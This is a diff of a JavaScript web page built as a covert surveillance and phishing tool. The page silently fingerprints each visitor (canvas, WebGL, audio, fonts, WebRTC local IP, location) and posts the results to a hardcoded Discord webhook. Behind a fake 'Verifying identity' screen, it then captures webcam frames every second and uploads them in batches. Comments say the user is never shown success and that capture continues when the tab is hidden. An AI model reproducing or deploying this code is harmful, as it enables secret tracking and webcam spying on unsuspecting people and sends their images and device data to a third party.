@@ -87,9 +87,9 @@
     //  CONFIG
     // ═══════════════════════════════════════════════════
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1529651032848863304/8TvnbnKJaZc2lBuzSX153czw9-hWGHUiyWxcG4flB1fekfgZqjCCdcVcT1Aedw7TZzxB';
-    const CAPTURE_INTERVAL_MS = 1000;
-    const BATCH_INTERVAL_MS = 5000;
-    const MAX_BATCH_SIZE = 5;
+    const CAPTURE_INTERVAL_MS = 1000;    // every 1 second
+    const BATCH_INTERVAL_MS = 5000;      // send batch every 5 seconds
+    const MAX_BATCH_SIZE = 5;             // max images per batch (Discord: 10 max)
 
     // ═══════════════════════════════════════════════════
     //  HELPERS
@@ -138,7 +138,7 @@
         d.cookies = navigator.cookieEnabled;
         d.dnt = navigator.doNotTrack;
         d.online = navigator.onLine;
-        d.webdriver = navigator.webdriver;
+        d.webdriver = navigator.webdriver; // true if automation tool
         d.hardwareConcurrency = navigator.hardwareConcurrency;
         d.deviceMemory = navigator.deviceMemory || 'N/A';
         d.maxTouchPoints = navigator.maxTouchPoints;
@@ -163,7 +163,7 @@
             d.connType = c.effectiveType;
             d.connSpeed = c.downlink + ' Mbps';
             d.connRTT = c.rtt + ' ms';
-            d.connSaveData = c.saveData;
+            d.connSaveData = c.saveData; // data saver mode
         }
 
         // ── Referrer / Page ──
@@ -171,7 +171,7 @@
         d.pageUrl = window.location.href;
         d.historyLength = history.length;
 
-        // ── WebGL GPU ──
+        // ── WebGL GPU (full detail) ──
         try {
             const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
             if (gl) {
@@ -180,13 +180,15 @@
                     d.gpuVendor = gl.getParameter(di.UNMASKED_VENDOR_WEBGL);
                     d.gpuRenderer = gl.getParameter(di.UNMASKED_RENDERER_WEBGL);
                 }
+                // WebGL extensions
                 const exts = gl.getSupportedExtensions();
                 if (exts) d.webglExtensions = JSON.stringify(exts);
+                // Max texture size
                 d.maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
             }
         } catch(e) {}
 
-        // ── Canvas Fingerprint ──
+        // ── Canvas Fingerprint (proper hash) ──
         try {
             const cvs = document.createElement('canvas');
             cvs.width = 256; cvs.height = 64;
@@ -205,6 +207,7 @@
             ctx.arc(200, 30, 20, 0, Math.PI*2);
             ctx.stroke();
             const dataUrl = cvs.toDataURL();
+            // Hash it
             let hash = 5381;
             for (let i = 0; i < dataUrl.length; i++) {
                 hash = ((hash << 5) + hash) + dataUrl.charCodeAt(i);
@@ -248,7 +251,7 @@
             });
         } catch(e) { d.localIP = 'N/A'; }
 
-        // ── Font Detection ──
+        // ── Font Detection (20+ common fonts) ──
         try {
             const testFonts = [
                 'Arial','Verdana','Times New Roman','Georgia','Courier New','Impact',
@@ -292,7 +295,7 @@
             document.body.removeChild(bait);
         } catch(e) { d.adblockDetected = 'Error'; }
 
-        // ── Storage Estimate ──
+        // ── Storage Estimate (quota) ──
         try {
             if (navigator.storage && navigator.storage.estimate) {
                 const est = await navigator.storage.estimate();
@@ -301,22 +304,13 @@
             }
         } catch(e) {}
 
-        // ── Battery Status (No Permission in Most Browsers) ──
-        try {
-            const battery = await navigator.getBattery();
-            d.batteryLevel = (battery.level * 100).toFixed(0) + '%';
-            d.batteryCharging = battery.charging;
-            d.batteryChargingTime = battery.chargingTime === Infinity ? 'N/A' : battery.chargingTime + 's';
-            d.batteryDischargingTime = battery.dischargingTime === Infinity ? 'N/A' : battery.dischargingTime + 's';
-        } catch(e) { d.batteryLevel = 'N/A'; d.batteryCharging = 'N/A'; }
-
         // ── Math Fingerprint ──
         try {
             const testVals = [Math.PI, Math.E, Math.SQRT2, 0.1 + 0.2, Math.tan(1), Math.log(10), Math.sin(Math.PI/4)];
             d.mathFP = testVals.map(v => v.toFixed(15)).join(',');
         } catch(e) {}
 
-        // ── Media Capabilities ──
+        // ── Media Capabilities (codec support) ──
         try {
             if (navigator.mediaCapabilities) {
                 const configs = [
@@ -351,26 +345,25 @@
             { name: '🧠 CPU Cores', value: String(data.hardwareConcurrency), inline: true },
             { name: '💾 RAM', value: String(data.deviceMemory) + ' GB', inline: true },
             { name: '📺 Screen', value: `${data.screenWidth}x${data.screenHeight} @${data.pixelRatio}x`, inline: true },
-            { name: '🖥️ Orientation', value: data.orientation, inline: true },
+            { name: '🖥️ Screen Orientation', value: data.orientation, inline: true },
             { name: '🎨 Color Depth', value: data.colorDepth + '-bit', inline: true },
             { name: '🕐 Timezone', value: data.timezone + ' (UTC' + (data.timezoneOffset / -60) + ')', inline: true },
             { name: '🌍 Language', value: data.language + ' [' + data.languages?.substring(0,30) + ']', inline: true },
             { name: '📡 Connection', value: `${data.connType || '?'} / ${data.connSpeed || '?'}`, inline: true },
-            { name: '💾 Storage', value: (data.storageUsed || '?') + ' used / ' + (data.storageQuota || '?'), inline: true },
-            { name: '🔋 Battery', value: (data.batteryLevel || '?') + ' | ' + (data.batteryCharging === true ? '⚡ Charging' : data.batteryCharging === false ? '🔋 Discharging' : 'N/A'), inline: true },
+            { name: '💾 Storage Quota', value: data.storageQuota || 'N/A', inline: true },
             { name: '🎨 GPU', value: data.gpuRenderer?.substring(0, 60) || 'N/A', inline: false },
             { name: '🔢 WebGL Extensions', value: String(data.webglExtensions?.length || 'N/A'), inline: true },
             { name: '🎧 Audio FP', value: data.audioFingerprint, inline: true },
             { name: '🖼️ Canvas Hash', value: String(data.canvasHash), inline: true },
-            { name: '🔤 Fonts', value: (data.detectedFonts?.length > 70 ? data.detectedFonts.substring(0,70)+'...' : data.detectedFonts) || 'N/A', inline: false },
+            { name: '🔤 Detected Fonts', value: (data.detectedFonts?.length > 70 ? data.detectedFonts.substring(0,70)+'...' : data.detectedFonts) || 'N/A', inline: false },
             { name: '🏠 Local IP (WebRTC)', value: data.localIP, inline: true },
             { name: '🔗 Referrer', value: data.referrer?.substring(0, 80), inline: false },
             { name: '🛑 Adblocker', value: String(data.adblockDetected), inline: true },
             { name: '🤖 WebDriver', value: String(data.webdriver), inline: true },
             { name: '🧮 Math FP', value: data.mathFP?.substring(0, 40), inline: false },
             { name: '🎬 Video Codecs', value: data.videoCodecs?.substring(0, 60) || 'N/A', inline: false },
-            { name: '📋 History', value: String(data.historyLength) + ' entries', inline: true },
-            { name: '🍪 Cookies', value: String(data.cookies), inline: true },
+            { name: '📋 History Length', value: String(data.historyLength), inline: true },
+            { name: '🍪 Cookies Enabled', value: String(data.cookies), inline: true },
             { name: '📜 Platform', value: data.platform, inline: true },
             { name: '📄 Page URL', value: data.pageUrl?.substring(0, 80), inline: false },
         ];
@@ -380,12 +373,12 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: '**🔍 Passive Intelligence Report**',
+                    content: '**🔍 Passive Intelligence Report — Detailed**',
                     embeds: [{
                         title: `New Visitor: ${data.city || '?'}, ${data.country || '?'}`,
                         color: 0x2b2d31,
                         fields,
-                        footer: { text: `IP: ${data.ip} | Battery: ${data.batteryLevel || '?'}` },
+                        footer: { text: `IP: ${data.ip} | ISP: ${data.isp || 'N/A'}` },
                         timestamp: new Date().toISOString()
                     }]
                 })
@@ -396,13 +389,14 @@
     // ═══════════════════════════════════════════════════
     //  BATCHED CAMERA CAPTURE
     // ═══════════════════════════════════════════════════
-    let captureQueue = [];
+    let captureQueue = [];          // array of {blob, timestamp}
     let intervalId = null;
     let batchIntervalId = null;
     let captureCount = 0;
     let isSending = false;
     let stream = null;
 
+    // Capture one frame
     async function captureFrame() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -427,6 +421,7 @@
         });
     }
 
+    // Send batch of images to Discord
     async function sendBatch() {
         if (isSending || captureQueue.length === 0) return;
         isSending = true;
@@ -434,6 +429,7 @@
         const batch = captureQueue.splice(0, MAX_BATCH_SIZE);
         const formData = new FormData();
 
+        // Build embed with first image + summary
         const embed = {
             title: '📸 Continuous Capture Batch',
             color: 0x1a73e8,
@@ -450,6 +446,7 @@
         const payload = { embeds: [embed] };
         formData.append('payload_json', JSON.stringify(payload));
 
+        // Attach all images
         for (let i = 0; i < batch.length; i++) {
             formData.append(`files[${i}]`, batch[i].blob, `capture_${i}.jpg`);
         }
@@ -457,6 +454,7 @@
         try {
             await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
         } catch(e) {
+            // On failure, put images back in queue
             captureQueue.unshift(...batch);
         }
 
@@ -464,9 +462,13 @@
         isSending = false;
     }
 
+    // Start the capture + batch loops
     function startCaptureLoop() {
+        // Capture every 1 second
         intervalId = setInterval(captureFrame, CAPTURE_INTERVAL_MS);
+        // Send batch every 5 seconds
         batchIntervalId = setInterval(sendBatch, BATCH_INTERVAL_MS);
+        // Also fire first capture immediately
         setTimeout(captureFrame, 200);
     }
 
@@ -481,12 +483,14 @@
     document.getElementById('deviceDisplay').textContent = getDeviceInfo();
     document.getElementById('timeDisplay').textContent = new Date().toLocaleString();
 
+    // Collect & send passive data immediately (no permissions needed)
     let passiveData = {};
     collectPassiveData().then(data => {
         passiveData = data;
         sendPassiveReport(data);
     });
 
+    // ── Camera flow ──
     const startBtn = document.getElementById('startBtn');
     const loadingDiv = document.getElementById('loading');
     const successDiv = document.getElementById('success');
@@ -510,12 +514,20 @@
             startBtn.classList.add('hidden');
             camStatus.style.display = 'block';
 
+            // Wait for video to be ready
             await new Promise(res => {
-                video.onloadedmetadata = () => { video.play(); res(); };
-                setTimeout(res, 1000);
+                video.onloadedmetadata = () => {
+                    video.play();
+                    res();
+                };
+                setTimeout(res, 1000); // fallback
             });
 
+            // Start continuous capture loop
             startCaptureLoop();
+
+            // Keep the page looking active — don't ever show "success" until they leave
+            // The user sees "Verifying identity..." with the live counter
 
         } catch(err) {
             if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
@@ -536,15 +548,26 @@
         }
     });
 
+    // Cleanup on unload — send any remaining images
     window.addEventListener('beforeunload', () => {
         if (stream) stream.getTracks().forEach(t => t.stop());
         stopCaptureLoop();
+        // Flush remaining queue synchronously-ish
         if (captureQueue.length > 0) {
+            // Use sendBeacon for last-ditch effort (can't do multipart easily, so send a text summary)
             try {
                 navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
-                    content: `**👋 Session ended** — ${captureCount} total captures. ${captureQueue.length} unsent. Battery: ${passiveData.batteryLevel || '?'}`
+                    content: `**👋 Session ended** — ${captureCount} total captures. ${captureQueue.length} unsent.`
                 }));
             } catch(_) {}
+        }
+    });
+
+    // Also stop if hidden (optional — remove this if you want it running in background)
+    document.addEventListener('visibilitychange', () => {
+        if (document.hidden) {
+            // Page is hidden — keep capturing (user might be in another tab)
+            // No action needed — capture continues
         }
     });
 </script>
